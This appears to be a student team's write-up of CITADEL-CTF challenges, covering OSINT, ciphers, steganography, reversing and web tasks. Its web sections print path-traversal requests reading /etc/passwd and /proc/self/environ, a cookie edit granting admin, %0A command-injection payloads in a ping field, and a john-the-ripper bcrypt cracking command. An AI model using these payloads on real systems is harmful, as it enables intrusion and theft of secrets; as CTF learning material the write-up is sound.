# 1. ZAHARD'S WELCOME
This challenge was an OSINT. Here we had to directly go into the discord server of CITADEL-CTF and find the flag from there.

### MY SOLVE
**Flag:** ` citadel{7h3_c174d3l_b3ck0n5}`

### THOUGHT PROCESS/STEPS
In this challenge, we just had to follow a simple clue — the invitation link provided in the description. Once we clicked on it, 
it led us to the discord server, and from there, we explored the channels a bit. Eventually, we headed to the #rules channel, and 
that’s where we found the flag at the very beginning.

### References
https://discord.com/channels/1291123172720250892/1421569359733719060

# 2.THE SOCIAL NETWORK
Again an OSINT, this challenge wanted us to go into the instagram page of `citadwellers` and find the flag from their instagram post.

### MY SOLVE
**Flag:** ` citadel{17_1s_jus7_7h3_b3g1nn1ng}

### THOUGHT PROCESS/STEPS
In this challenge, we first headed to the Instagram page citadweller, where we found the first part of the flag hidden in one of 
the stories. Along with it, there was another clue that pointed us toward a Twitter page. When we checked there, we discovered 
the second part of the flag. After that, we simply combined both parts — and that gave us the complete flag.

# 3.OMNISCIENT FLAG'S METADATA
This challenge just gave us a Jpeg image. It was indicated that we would have to find out the flag from the image. It was meant that we have to access the metadata hidden in the image and the flag would be in there.

### MY SOLVE
**Flag:** ` citadel {th1s_ch4ll3ng3_1s_f0r_th4t_On3_ex1ft00l_4ndb1nw4lk_enthus14st}`

### THOUGHT PROCESS/STEPS
In this challenge, we first downloaded the given JPG file and then searched online for an Exif tool, since the challenge hinted that 
the image contained hidden metadata. Using the tool, we checked the metadata and noticed a clue in the author name field — it 
hinted that there was another image hidden inside this one. Following that lead, we searched for an image layer extractor and found 
a website called Aperisolve. We uploaded the image there, and it provided us with a downloadable ZIP file containing the extracted 
layers. Inside that ZIP, we found a PNG image — and that image had the flag written on it.

### REFERENCES 
https://exif.tools/
https://aperisolve.fr/

### WHAT I LEARNT 
Learnt the use of exif and binwalk tools.

# 4.TRACK 8
“Bypassing the second chamber leads to an empty floor except for a single artifact in the center: an old MP3 player, scratched 
and worn. On its surface, a cipher is etched, a message left behind for anyone who can decode it:
twj eys zpr ukm 'viamnwqw' bx lzgo: esmqqui{yyr_oshwwcm_bwupa}
When you power it on, the sound fills the chamber. The tracks play like whispers from a lost world, and you recognize it as a song 
from Panchiko’s latest studio album, particularly track no. 8. Its title feels familiar, hinting at a famous cipher. Decrypt it 
by using the album name as your key and continue your ascent.” 

### MY SOLVE
**Flag:** ` citadel{add_vinegar_twice}`

### THOUGHT PROCESS/STEPS
After carefully reading the full description, the first hint that caught our attention was “Panchiko’s latest studio album.” We 
googled that exact phrase and found that the album was Ginkgo. Next, we checked the 8th track of this album and discovered its title — 
“Vinegar.”
The challenge description also mentioned that this title hinted toward a particular cipher. Seeing the word vinegar, we immediately 
searched “vinegar cipher” on Google, and the first result was actually a Vigenère cipher encoder/decoder website.

We used that site and entered the given encrypted text:

twj eys zpr ukm 'viamnwqw' bx lzgo: esmqqui{yyr_oshwwcm_bwupa}


using the key “Ginkgo” (as the challenge mentioned that the key was the album name).

This gave us a new encrypted output:

rigckmv{osd_ikumqog_tjkjm}


We noticed another clue in the description telling us to use this new text again with the key “PANCHIKO.” So, we decrypted the 
new text with that key — and that’s when we finally got our flag.

### REFERENCES 
https://cryptii.com/pipes/vigenere-cipher

### WHAT I LEARNT 
Learnt what is a cipher .

# 5.TEST OF SWEETNESS
“This floor feels like a digital world. The space is an illusion, all pink and sweet, stretching around you in impossible patterns. 
Here, you are no longer a climber but just another user.
Ahead, a door glows faintly. It is the only path forward and requires a level of authority you do not yet have. Fragments of session 
memory flicker, hinting at what it might take to gain higher access..” 

### MY SOLVE
**Flag:** ` citadel{fru1tc4k3_4nd_c00k13s}`

### THOUGHT PROCESS/STEPS
In this challenge, a link to a website was provided, and our main goal was to become the admin instead of a regular user. The first 
thing that came to our mind was to right-click and inspect the page — hoping to find something hidden in the source code or 
developer tools.All four of us started digging through the developer tools, exploring every tab — Elements, Console, Network, 
Application. Everything we could think of. It took quite a while, and honestly, it was a bit frustrating because nothing obvious 
showed up at first.But after carefully going through the details, we finally discovered what the challenge was hinting at — 
the cookie data as it said “session memory flicker” when we googled about it we came to know that session memory means temporary data 
and website’s temporary data is stored in cookies. We realized that by editing the cookie under application tab  and changing its 
value from user to admin, we could elevate our access level. Once we made that change and refreshed the page, we successfully 
became the admin and got the flag.

### REFERENCES 
https://testofsweetness.citadel.cryptonitemit.in/

### WHAT I LEARNT 
Learnt a simple way to take admin access of a website that if possible we could use a cookie edit if the website uses cookies .

# 6.ROTTEN APPLE
“Among the debris of this floor, you find a relic of sound: An album which turns out to be D>E>A>T>H>M>E>T>A>L by Panchiko, a long 
lost album. But the music is warped, as though it has undergone disc rot.

The path forward is hidden in the distortion. Similar to how the album was warped, the password to the next floor has been warped 
first by a factor of 47, then by a factor of 13. Untangle these changes to reveal the code and continue your ascent.

4:R256=Y3oRRoP0#~%Ro?A” 

### MY SOLVE
**Flag:** ` citadel{b3tt3r_ROTt3n}`

### THOUGHT PROCESS/STEPS
In this challenge, the description mentioned that the flag had been “warped” first by a factor of 47 and then by 13 — in other 
words, it had been rotated by 47 and then by 13. Undoing this was just a matter of reversing the rotations.
What we did was take the provided text:
4:R256=Y3oRRoP0#~%Ro?A
First, we googled ROT13, found a site to apply it, pasted the text, and got the output:
4:E256=L3bEEbC0#~%Eb?N
Next, we took this result, searched for ROT47, pasted it into a ROT47 tool, and after rotating, we finally got the flag.
The trickiest part was understanding what the description meant by “warping” → rotation. That wasn’t obvious at first, but hints 
like the challenge name and the phrase “disc rot” pointed us toward ROT ciphers, guiding us to the correct method.

### REFERENCES 
https://rot13.com/
https://www.dcode.fr/rot-47-cipher

### WHAT I LEARNT 
Learnt about ROT ciphers.

# 7.RANDOMLY ACCESSED MEMORIES
"On your ascent to this floor, you hear these fragments being played back —

clone it, pull it, reset it, stage it, 
commit, push it, fork, rebase it. 
merge it, branch it, tag it, log it, 
add it, stash it, diff, untrack it … 
You look around and discover a chamber containing a vast archive of Daft Punk’s music, intertwined with cryptic commits left behind by other musicians. They seem ordinary at first glance, but not everything in the history is what it seems. The archive: https://github.com/evilcryptonite/daft-punk-archive"

### My solve
**Flag:** `citadel{w3_4r3_up_4ll_n1t3_t0_g1t_lucky}`

On opening the github link we could find nothing in the beginning. We opened each and every notes files and found nothing relevant. On going into the changes file and looking at all the changes closely we first found that commit 56 was missing from the list. We continued reading each and every line for more clues and found two more numbers missing that is 122 and 279. Now, we clearly had to search for those commits. We straightaway went to check inside the commit history of the repo and on scrollong through it we could see randomly arranged commit messages but then there was a commit named - Add secret chunk 3(base64) [commit 279]. Similarly we found the rest two secret commits also. Then, the next problem was that we had to convert the base 64 encoded data into the flag. We simply went into a base64 encoder and decoder software and pasted the three encoded statements. Eureka, our flag got printed in front of our eyes.

### What I learnt
I learnt about base 64 encryption mostly and practised on browsing github commit histories

### References
https://www.base64decode.org/  - the base64 encoder and decoder software

# 8.SELECTED AMBIENT WORK
“The symphonic adventure does not end here. On the next floor, a single song keeps echoing through the floor, repeating in a 
haunting loop. Amid the sound, you find a note left by a past candidate. It hints that the song holds a secret message, hidden in 
plain sight, much like how Aphex Twin concealed his face within his music with the help of spectrograms.
To move forward, you must find the message hidden in this sound.
Note: Separate the words in the flag with _ and make it UPPERCASE. Example: citadel{S3L3CT3D_AMB13NT_W0RK}” 

### MY SOLVE
**Flag:** ` citadel{1_LOV3_1DM}`

### THOUGHT PROCESS/STEPS
In this challenge, we were provided with an audio file, when listened to the audio file we realized that it was morse code but the 
twist was that it had a considerable amount of background music so do make the morse code clearer we had to clear aout the 
background music, we used audacity for that purpose first we went on analyse-plot spectrum to figure out what was the peak 
frequency for a beep i.e 1000hz then I went to effects applied high pass filter then low pass filter and then did some 
amplification to get the beeps louder and lil isolated then rest of the audio then finally I exported the new audio and used an 
online morse code decoder site to decrypt the audio file which gave me what was said in the audio the text came out to be 
“RICHARD D JAMES AKA APHEX TWIN IS A BRITISH MUSICIAN, COMPOSER AND DJ ACTIVE IN ELECTRONIC MUSIC SINCE 1988 1 L0V3 1DM AND IS A 
PIONEERING FIGURE IN THE INTELLIGENT DANCE MUSIC IDM GENRE.”  The odd part from this was 1 L0V3 1DM which was basically but the 
content of the flag.

### REFERENCES 
https://www.audacityteam.org/
https://morsecode.world/international/decoder/audio-decoder-adaptive.html

### WHAT I LEARNT 
Learnt the process of decoding a morse code.



# 9.ROBOTS_TRAIL
“You enter a virtual maze, a labyrinth of shifting corridors and endless paths. A guardian robot patrols the floor, leaving a 
trail behind as it moves. Follow the path it carves, trace its movements carefully, and uncover the key it leads you to. Only by 
following the robot’s trail can you reach the door to the next floor. 
Challenge: https://therobotstrail.citadel.cryptonitemit.in” 

### MY SOLVE
**Flag:** ` citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`

### THOUGHT PROCESS/STEPS
We clicked the link in the challenge description and landed on a page with five clickable decoy files — every one led to the same 
dead end. After some time searching the visible UI, we opened the browser devtools and inspected the page source. Hidden in the 
DOM we found this snippet:
<div class="hidden">
<p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
</div>
That pointed us to https://therobotstrail.citadel.cryptonitemit.in/robots.txt. The robots file contained a hint:
Hint for curious explorers:

Sometimes system files like /etc/passwd can reveal interesting information

Following that hint, we tried the file viewer endpoint with /etc/passwd:

https://therobotstrail.citadel.cryptonitemit.in/file?path=/etc/passwd

That page gave another hint which led us to check:

/var/www/html/config.php

So we loaded:

https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/www/html/config.php

From there, another clue pointed to the webserver logs, so we checked:

https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/log/apache2/access.log
A subsequent hint mentioned environment variables:
Interesting environment variables might be found at /proc/self/environ

We fetched:
https://therobotstrail.citadel.cryptonitemit.in/file?path=/proc/self/environ
Inside /proc/self/environ we discovered an environment entry:

SECRET_LOCATION=/home/ctf/.secret

That led us to:
https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret

The directory listing there showed:

Directory listing for /home/ctf/.secret:
total 12
drwx------ 2 ctf ctf 4096 Jan 1 10:00 .
drwxr-xr-x 5 ctf ctf 4096 Jan 1 09:55 ..
-r-------- 1 ctf ctf 48 Jan 1 10:00 flag.txt

So we opened:
https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret/flag.txt
and retrieved the flag.

### WHAT I LEARNT 
I learnt patience

# 10.Rotting In The Deep

The challenge provides a cryptic message on a chamber floor with a sequence of numbers and a hint about reversing a transformation. The task is to decode the given output by reversing a digit-wise Caesar cipher applied to the flag. Each digit in the flag has been shifted 3 steps forward, and we need to shift them back to retrieve the original message.

### My Solve

**Flag:** `citadel{br0_r34lly_unr0tt3d_m3_b4ck_t0_l1f3}`

1. The provided Python script (`chal.py`) shifts each digit of the flag by 3 positions forward using modulo 10. The output is a long string of digits in `out.txt`.

2. To retrieve the original flag, each digit in the output string needs to be shifted back by 3 positions.

3. The `long_to_bytes` function from the `Crypto.Util.number` module is necessary. So we installed the package using `pip install pycryptodome` so that we can run it locally.
    ```python
    from Crypto.Util.number import long_to_bytes

    out = "6895840967002953721051398351211751734500850509315790892845302801984496338433523326225010635779036738800318"
    KEY = 3

    decoded_digits = ""
    for d in out:
        decoded_digits += str((int(d) - KEY) % 10)

    num = int(decoded_digits)
    flag = long_to_bytes(num)
    print(flag)

    ```
4. Thus the output was
    ```
    b'citadel{br0_r34lly_unr0tt3d_m3_b4ck_t0_l1f3}'
    ```

This code processes each digit, shifts it back by 3, reconstructs the number, and converts it back to the original bytes. So we get our flag by directly running it in VS Code.

### What I Learned
- This challenge taught me about reversing digit-wise ciphers and using the `long_to_bytes` function. 
- It taught us about ciphers and understanding encoding and decoding processes.

### References
- Searched for `long_to_bytes` usage.
- Explored reversing number shifting techniques with ChatGPT guidance and google guidance.

# 11.Coco Conjecture
The challenge is about solving a mathematical problem presented by "the dragon CEO". The problem is related to the Collatz Conjecture, where we need to determine the number of steps required to reduce a given number to 1 using the conjecture's rules. The goal is to automate this process and communicate with a remote server to get the flag.


### My Solve
**Flag:** `citadel{k1ryu_c0c0_h4s_4_g0_4t_4n_uns0lv3d_m4th3m4t1cs_pr0bl3m}`

1. So we identified that the problem was based on Collatz Conjecture after some research on Google.
2. Using the provided `helper.md` and a PDF explaining the conjecture, we created a Python script to communicate with the remote server.
3. The script uses `pwntools` to establish a connection and receive numbers from the server.
4. For each number received, the Collatz steps were calculated as it was instructed in the pdf.
   - If the number is even, it is divided by 2.
   - If the number is odd, it is multiplied by 3 and incremented by 1.
5. The count of steps to reach 1 is sent back to the server.(we have to exclude the starting value count)
6. The script continues this process until the flag is received.(Till all the test cases matches...)
    ```python
    from pwn import remote
    import re

    r = remote("127.0.0.1", 420)
    while True:
        line = r.recvline(timeout=10)
        if not line:
            break
        msg = line.decode().strip()
        print(msg)
        m = re.search(r"Round \d+: (\d+)", msg)
        if m:
            n = int(m.group(1))
            count = 0
            while n != 1:
                if n % 2 == 0:
                    n //= 2
                    count += 1
                else:
                    n = 3 * n + 1
                    count += 1
            r.sendline(str(count))
            print("-> sent:", count)
        elif "citadel{" in msg:
            break
    r.close()
    ```
7. So in output there were many test cases and numbers that were checked after all it gave us with the flag.

### What I Learned

- The Collatz Conjecture is a fundamental problem in mathematics where we need to reduce any positive integer to 1 using specific rules.
- Automating tasks involving network communication or to connect and communicate to a server can be done using tools like `pwntools`.(or socket which we have not used)
- We learned how to write a code by going throught the syntax.

### References
- Google for identifying the problem as the Collatz Conjecture.
- ChatGPT and google for syntax help with the Python script.
- `Helper.md` file for instructions on connecting to the remote server.
- PDF file explaining the logic behind the Collatz Conjecture.

# 12.Schlagenheim
The challenge gives us a corrupted WAV file containing a hidden passcode needed to unlock the next challenge. The file, though named `.wav`, is scrambled. The task is to repair this file to extract the passcode.

### My Solve

**Flag:** `citadel{8lackM1D1wa5c00l}`

1. I opened the WAV file on Windows, which didn't work.
2. So I searched on google and found the `xxd` command to view the hex dump. So i wrote in shell `xxd -l 16 mysong.wav` to view the hex dump, revealing bytes starting with `4d31 4431`.
3. So i was just looking and found there that M1D1 was written in hex. After searching, I found that the file might be a MIDI since MIDI headers start with `4D 54 68 64`. I then changed them using an online hex editor to resemble a MIDI header.
    ```
    4D 31 44 31  -> M1D1
    4D 54 68 64  -> MThd
    ```
4. Then I imported the edited `.mid` file into Audacity, where the flag appeared in the audio data.

### What I Learned
- File headers like WAV and MIDI can be identified using hex dumps. A correct header is crucial for proper file recognition.
- Tools like `xxd` and hex editors are essential for diagnosing and correcting file issues.
- MIDI files store musical notes, which can hide text messages.

### References
- Google for MIDI structure and xxd usage.
- [hexed.it](https://hexed.it/) for hex editing.
- Audacity for MIDI playback and analysis.

 # 13._XOR_SLIDE
 "You realise that a previous climber has set up a puzzle in what was otherwise an empty room, blocking the entrance to the next floor on the ceiling. You must slide the blocks forming the pyramid to create a path above."
 
 ### My solve
 **Flag:** `citadel{pyr4m1d+x0r}`

 

 
 ### What I learned

 # 14.The Sound of Music
The challenge required participants to track the digital footprints of a user named `citadweller` across various music platforms. The goal was to find three segments of a flag hidden on these platforms, which when combined would reveal the complete flag. This challenge tested OSINT focusing on the ability to gather information from public profiles and links shared by the user.

### My Solve
**Flag:** `citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n_n_started_shar1ng_st0r1es_n_then_they_were_n0where_t0_be_f0und}`

I began by searching for various music related websites where there might be some clue and from goodle I found something called Rate your music a  music platform where users typically post album ratings and listening history. 
I found a RateYourMusic profile at `https://rateyourmusic.com/~citadweller`, where the second part of the flag was hidden: `_n_started_shar1ng_st0r1es`.
On the same profile, there was a link to a Spotify account. Upon exploring the public playlist, I found the third part of the flag in the playlist description: `_n_then_they_were_n0where_t0_be_f0und`.
I continued the search and discovered a Last.fm profile at `https://www.last.fm/user/citadweller` . In the shoutbox section, the first part of the flag was located: `citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n}`.
By combining all three parts, I reconstructed the complete flag.

### What I Learned
This challenge teaches us to be more vigilant and perform OSINTs in a better manner.
I also learned that persistence is key in tracking digital footprints as clues can be hidden in any unrelated places.

### References
https://rateyourmusic.com
https://www.spotify.com
https://www.last.fm

  # 15.ECHOES_AND_PINGS
  

  # 16._THE_RIPPER
  This challenge had provided us with a hashed text and a long list  of words any one of which could be our flag. We had to decode the text and match with the       wordlist in order to find the correct flag.
  
  ### My solve
  **Flag:** `citadel{fake_flag_4_fake_pl4y3rs}`

  We began with a research on what a hash actually is and what that line of random characters might imply and on asking AI it told us about the bcrypt encryption or hashing technique. We also tried various websites for checking what the hash meant but they could only tell us about what type of hash it was but not how we could decode it. We moved on to looking at the wordlist which was probably a list of all the various random flags one of which would have been the actual flag which was hashed in the other file. So, on googling further we found about the John-The_Ripper software which helps decode hashes and encryptions. It can also compare the hash with the wordlist and give the correct flag. So, I began with looking at videos and asking ai how to install the john software on my system. I did this and then I found the steps and commands required to use the john-the-ripper software. I used the linux cli, created files, stored the hash and the wordlist in one directory(crackdir) and then used john on that directory with the particular command
  ```
cd ~/crackdir
/tmp/john-jumbo/run/john --format=bcrypt --wordlist=wordlist.txt hashes.txt
john --show ~/crackdir/hashes.txt
```
This printed my required password `fake_flag_4_fake_pl4y3rs` on my CLI.
this when used in the proper format makes the flag.
  
### What I learned
 First and foremostm I learned about the John-the-Ripper software which is used to crack passwords from their hash encryptions. It can use a wordlist or specific list of preset passwords and compare them to the hash in order to figure out the real password. That's what we applied here and thus we also learnt how to use it on the cli. I installed it, ran it, found the commands and steps required from the web and also from AI and found the flag. It gave me experience on what to do when required to handle hashes and passwords.

# AetherCorp NetprobeX
This challenge required us to uncover a hidden backdoor in the NetProbeX system, a remnant of the former AetherCorp. The task involved analyzing logs and exploiting vulnerabilities to retrieve a passcode. The engineers left subtle hints in the logs, which we had to decipher to progress. Our goal was to find and exploit this backdoor to get the flag.

## My solve
*Flag:* citadel{bl4ck51t3_4cc3ss_gr4nt3d}

Initially, We were unsure what to do, so we started by testing the input field with the placeholder text provided. so we entered 8.8.8.8 in the textbox, which triggered a ping command. Here is the response we received:

   ```bash
   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.90 ms
   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.85 ms
   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.95 ms
   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.96 ms


   --- 8.8.8.8 ping statistics ---
   4 packets transmitted, 4 received, 0% packet loss, time 3005ms
   rtt min/avg/max/mdev = 3.845/3.913/3.961/0.046 ms
 ```

We tried entering other commands like ls but received an error: ping: ls: No address associated with hostname. This indicated that the system was interpreting our input as part of the ping command and not executing shell commands directly.
We got to know about using %0A to inject multiple commands. So we tested this by entering 8.8.8.8%0A ls:
   ```bash
   Executing: ping -c 4 8.8.8.8%0A ls
   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.82 ms
   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=4.00 ms
   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.97 ms
   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.97 ms
   --- 8.8.8.8 ping statistics ---
   4 packets transmitted, 4 received, 0% packet loss, time 3004ms
   rtt min/avg/max/mdev = 3.818/3.938/4.000/0.070 ms
   app.py
   mission_briefing.txt
   requirements.txt
   templates
   ```
We tried reading the contents of mission_briefing.txt using more (since cat wasn't working, so we searched on google to find any alternatives of cat):
  ``` 
   ================= OPERATION: SILENT ECHO =================
                   CLASSIFICATION: BLACK ICE

   Agent, your objective is to recover the Blacksite Key.
   Our intel confirms it’s hidden deep within the AetherCorp network.
   =========================================================
   ```
   The file hinted at a hidden key deep within the network.
We used the find command to locate directories related to AetherCorp. So we used the file command to search the location of the folder if it exists.:
   ```bash
   8.8.8.8%0A find / -name aethercorp
   ```
   This returned /var/lib/aethercorp as the only accessible folder with no permission constraints.

Exploring further we listed further and then after some more hit and trials found the archive folder and we found a hidden .secrets directory within /var/lib/aethercorp/archive using:

   ```bash
   8.8.8.8%0A ls /var/lib/aethercorp/archive -a
   ```
   Inside the .secrets directory was a file called blacksite_key.dat.

7. Finally, We viewed the contents of blacksite_key.dat using:

   ```bash
   8.8.8.8%0A more /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
   ```
   This revealed the flag.
   
## What I learned

This challenge taught me about:

Command Injection using %0A to chain commands in restricted environments.
Alternative File Viewing using tools like more or less when cat is unavailable or not allowed.
Navigating through system directories to uncover hidden files and folders.
Understanding how to interpret subtle hints left behind in logs.

## References
Google for command injection techniques and alternative file viewing methods.
ChatGPT for syntax and command structures.

  # 18.FEELS_LIKE_WE_ALWAYS_GO_BACKWARDS
  This challenge was about figuring out answers to 3 consequtive puzzles. However, there was no way one could get the answers out of the provided details. Thus, the only way was to use "Reverse-engineering". We all had to somehow find access to the program's source code, find clues and figure out answers from the code itself.
  
  ### My solve
  **Flag:** `citadel{f0r_0n3_m0r3_h0ur_1_c4n_r4g3}`

  We had been given a file named "tameimpala" first searched on AI about what type of file it was and how could we open it. We read and figured out that it was supposed to be opened using a reverse engineering software like ghidra. I then opened the file using ghidra and again searched on how to figure out stuff on ghidra. I eventually reached up to the defined strings window and started searching for familiar strings. I could find the code for the first level. From the if condition we found the line:     if (0xf < sVar2) {
      puts("okay okay maybe the sun\'s coming up.");
      FUN_00101340();
      return 1;
  On searching this meaning on chatgpt we found  that the song input must be greater than 15 to proceed and finally we went with the name of the level : "Music to walk home by" as the answer for level 1

  Then we went on to the string of level 2
  We saw that the code was comparing the input value to the hexadecimal value `0x1e6d9e9c7` which again we figured out the meaning using AI. This number is equal to 8167702983 and this was the answer for level 2.

  Finally we moved on to level 3
  In this step on putting the file and the ghidra output picture on AI, it told us to navigate to the particular address 00101020
  where we found this code
  ```
    if (sVar1 == 0x25) {
    lVar2 = 0;
    while (local_58[lVar2] ==
           (ushort)((ushort)local_88[lVar2] + ((ushort)lVar2 & 0xff) * 5 +
                   (ushort)(byte)param_1[lVar2] * 2)) {
      lVar2 = lVar2 + 1;
      if (lVar2 == 0x25) {
        return 1;
      }
    }
  }
  ```
  using AI we figured out a mathematical formula which had been used to encrypt the flag. Using that AI made a formula to reverse the code and get the flag back.
  
  ### What I learned
  I learnt to use Ghidra like applications for reverse engineering and how to efficiently use the LLMs in order to automate the code running and mathematics portion.

  
  
  
